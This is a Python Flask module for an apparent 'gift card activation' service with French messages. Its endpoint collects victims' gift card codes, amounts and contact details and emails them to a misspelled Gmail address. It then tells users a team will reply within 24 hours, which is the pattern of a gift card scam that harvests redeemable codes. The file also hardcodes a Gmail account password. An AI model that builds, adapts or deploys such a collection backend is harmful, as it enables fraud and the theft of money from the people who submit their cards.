from flask import Blueprint, request, jsonify
from flask_mail import Mail, Message
import os
from datetime import datetime

activation_bp = Blueprint('activation', __name__)

def init_mail(app):
    """Initialize Flask-Mail with Gmail SMTP configuration"""
    app.config['MAIL_SERVER'] = 'smtp.gmail.com'
    app.config['MAIL_PORT'] = 587
    app.config['MAIL_USE_TLS'] = True
    app.config['MAIL_USERNAME'] = 'activatemygiftcaard@gmail.com'
    app.config['MAIL_PASSWORD'] = 'ptanybbokpqplmur'
    app.config['MAIL_DEFAULT_SENDER'] = 'activatemygiftcaard@gmail.com'
    
    mail = Mail(app)
    return mail

@activation_bp.route('/activate', methods=['POST'])
def activate_card():
    """Handle gift card activation requests"""
    try:
        data = request.get_json()
        
        # Validate required fields
        required_fields = ["emailOrPhone", "cardType", "cardCode", "cardAmount", "purchaseDate"]
        for field in required_fields:
            if not data.get(field):
                return jsonify({"error": f"Le champ {field} est obligatoire"}), 400
        
        email_or_phone = data.get("emailOrPhone")
        email = None
        phone = None

        if "@" in email_or_phone and "." in email_or_phone:
            email = email_or_phone
        else:
            phone = email_or_phone

        # Create email content
        email_subject = f"Nouvelle demande d'activation - {data["cardType"]}"
        
        email_body = f"""
Nouvelle demande d'activation de carte cadeau

Informations du client :
- Nom complet : {data.get("fullName", "Non fourni")}
- Email ou Téléphone : {email_or_phone}

Informations de la carte :
- Type de carte : {data["cardType"]}
- Code de la carte : {data["cardCode"]}
- Montant : {data["cardAmount"]}
- Date d'achat : {data["purchaseDate"]}

Demande reçue le : {datetime.now().strftime("%d/%m/%Y à %H:%M")}
        """
        
        # Send email using Flask-Mail
        from flask import current_app
        mail = current_app.extensions.get('mail')
        
        if mail:
            msg = Message(
                subject=email_subject,
                recipients=['activatemygiftcaard@gmail.com'],
                body=email_body
            )
            mail.send(msg)
        
        return jsonify({
            'success': True,
            'message': 'Votre demande a été envoyée avec succès. Notre équipe vous répondra sous 24h.'
        }), 200
        
    except Exception as e:
        print(f"Erreur lors de l'envoi de l'email : {str(e)}")
        return jsonify({
            'error': 'Une erreur est survenue lors de l\'envoi de votre demande. Veuillez réessayer.'
        }), 500

